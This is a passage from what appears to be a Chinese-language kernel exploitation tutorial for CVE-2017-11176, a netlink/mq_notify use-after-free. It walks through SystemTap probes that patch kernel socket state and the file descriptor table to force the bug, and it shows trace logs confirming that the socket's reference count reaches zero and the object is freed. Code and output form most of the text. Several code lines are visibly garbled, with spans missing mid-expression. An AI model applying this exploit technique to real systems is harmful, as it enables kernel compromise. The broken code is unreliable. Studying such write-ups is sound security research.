    (20002-20002) [vfs] > netlink_getsockbyfilp (filp=0xffff88003ddd8380)
    (20002-20002) [netlink] > netlink_attachskb (sk=0xffff88003dde0400 skb=0xffff88003d3a6080 timeo=0xffff88002e233f40 ssk=0x0)
    -={ dump_netlink_sock: 0xffff88003dde0400 }=-    - sk = 0xffff88003dde0400
    - sk->sk_rmem_alloc = 0
    - sk->sk_rcvbuf = 133120
    - sk->sk_refcnt = 2
    - (before) nlk->state = 0
    - (after)  nlk->state = 1
    -={ dump_netlink_sock: END}=-    
    >>
    (20002-20002) [netlink] sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
                !sock_flag(sk, SOCK_DEAD))
                *timeo = schedule_timeout(*timeo);
            __set_current_state(TASK_RUNNING);
稍后我们将更加深入 _调度_ 的细节部分（参见第2部分），但现在只要知道我们的进程将阻塞直到满足特殊条件（都是关于等待队列）。
也许我们可以避免被调度/阻塞？为此，我们需要避免调用schedule_timeout()。让我们将sk标记为“SOCK_DEAD”（条件的最后一部分）。也就是说，改变“sk”内容（就像我们之前做的那样），使得以下函数sock_flag()返回真：
    // from [include/net/sock.h]
        static inline bool sock_flag(const struct sock *sk, enum sock_flags flag)
        {
          return test_bit(flag, &sk->sk_flags);
        }
        enum sock_flags {
          SOCK_DEAD,      // state = %x\n", (nlk->state & 0x1));
      nlk->state |= 1;            
      _stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));
      // mark it DEAD
      _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
      _stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD);
      sk->sk_flags |= (1 sk_flags = %x\n", sk->sk_flags);
重新运行......boom！exp主进程阻塞在了内核的无限循环中。原因是：
  * 它进入netlink_attachskb()函数并执行retry路径（先前设置的）
  * 线程没有被调度（被绕过了）
  * netlink_attachskb()返回1
  * 回到mq_notify()，执行“goto retry”语句
  * fget()返回一个非null值...
  * ...netlink_getsockbyfilp()返回无误
  * 接着再次进入netlink_attachskb（） ...
  * ...死循环...
因此，有效地绕过了阻塞我们的schedule_timeout()，但是产生了死循环。
## 避免死循环
继续改进探针，使fget()在第二次调用时失败！一种方法是直接从FDT中删除该文件描述符（设置为NULL）：
    %{
        #include 
        %}
        function remove_fd3_from_fdt:long (arg_unused:long)
        %{
            _stp_printf("!!>>> REMOVING FD=3 FROM FDT files;
            struct fdtable *fdt = files_fdtable(files);
            fdt->fd[3] = NULL;
        %}
        probe kernel.function ("netlink_attachskb")
        {
          if (execname() == "exploit")
          {
            printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)
            dump_netlink_sock($sk); // it also marks the socket as DEAD and CONGESTED
            remove_fd3_from_fdt(0);
          }
        }
    -={ CVE-2017-11176 Exploit }=-    netlink socket created = 3
    mq_notify: Bad file descriptor
    exploit failed!
    (3095-3095) [SYSCALL] ==>> mq_notify (-1, 0x7ffe5e528760)
    (3095-3095) [uland] ==>> copy_from_user ()
    (3095-3095) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
    (3095-3095) [uland] ==>> copy_from_user ()
    (3095-3095) [skb] ==>> skb_put (skb=0xffff88003f02cd00 len=0x20)
    (3095-3095) [skb] > fget (fd=0x3)
    (3095-3095) [vfs] > netlink_getsockbyfilp (filp=0xffff880031475480)
    (3095-3095) [netlink] > netlink_attachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00 timeo=0xffff88002d79ff40 ssk=0x0)
    -={ dump_netlink_sock: 0xffff88003cf56800 }=-    - sk = 0xffff88003cf56800
    - sk->sk_rmem_alloc = 0
    - sk->sk_rcvbuf = 133120
    - sk->sk_refcnt = 2
    - (before) nlk->state = 0
    - (after) nlk->state = 1
    - sk->sk_flags = 100
    - SOCK_DEAD = 0
    - sk->sk_flags = 101
    -={ dump_netlink_sock: END}=-    !!>>> REMOVING FD=3 FROM FDT > fget (fd=0x3)
    (3095-3095) [vfs] > netlink_detachskb (sk=0xffff88003cf56800 skb=0xffff88003f02cd00)
    (3095-3095) [netlink] > mq_notify (-1, 0x7ffe8f78c840)
    (3391-3391) [uland] ==>> copy_from_user ()
    (3391-3391) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
    (3391-3391) [uland] ==>> copy_from_user ()
    (3391-3391) [skb] ==>> skb_put (skb=0xffff88003d20cd00 len=0x20)
    (3391-3391) [skb] > fget (fd=0x3)
    (3391-3391) [vfs] > netlink_getsockbyfilp (filp=0xffff88003d84ed80)
    (3391-3391) [netlink] > netlink_attachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00 timeo=0xffff8800317a7f40 ssk=0x0)
    -={ dump_netlink_sock: 0xffff88002d72d800 }=-    - sk = 0xffff88002d72d800
    - sk->sk_rmem_alloc = 0
    - sk->sk_rcvbuf = 133120
    - sk->sk_refcnt = 2               // state = 0
    - (after) nlk->state = 1
    - sk->sk_flags = 100
    - SOCK_DEAD = 0
    - sk->sk_flags = 101
    -={ dump_netlink_sock: END}=-    !!>>> REMOVING FD=3 FROM FDT > fget (fd=0x3)
    (3391-3391) [vfs] > netlink_detachskb (sk=0xffff88002d72d800 skb=0xffff88003d20cd00)
    (3391-3391) [netlink] sk_rmem_alloc = 0
    - sk->sk_rcvbuf = 133120
    - sk->sk_refcnt = 0               // state = 1
    - (after) nlk->state = 1
    - sk->sk_flags = 101
    - SOCK_DEAD = 0
    - sk->sk_flags = 101
    -={ dump_netlink_sock: END}=-    (3391-3391) [SYSCALL] sk_refcnt_已经减少了两次！成功触发了这个漏洞。
因为 _sock_ 的引用计数为零，这意味着 _struct netlink_sock_ 对象将会被释放。再添加一些其他探针：
    ... cut ...
    (13560-13560) [netlink] > fget (fd=0x3)
    (13560-13560) [vfs] > netlink_detachskb (sk=0xffff88002d7e5c00 skb=0xffff88003d2c1440)
    (13560-13560) [kmem] ==>> kfree (objp=0xffff880033fd0000)
    (13560-13560) [kmem] > sk_free (sk=0xffff88002d7e5c00)
    (13560-13560) [sk] ==>> __sk_free (sk=0xffff88002d7e5c00)
    (13560-13560) [kmem] ==>> kfree (objp=0xffff88002d7e5c00) // 
    #include 
    #include 
    %}
    function force_trigger:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      sk->sk_flags |= (1 state |= 1;   // enter the netlink_attachskb() retry path    
      struct files_struct *files = current->files;
      struct fdtable *fdt = files_fdtable(files);
      fdt->fd[3] = NULL; // makes the second call to fget() fails
    %}
    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        force_trigger($sk);
      }
    }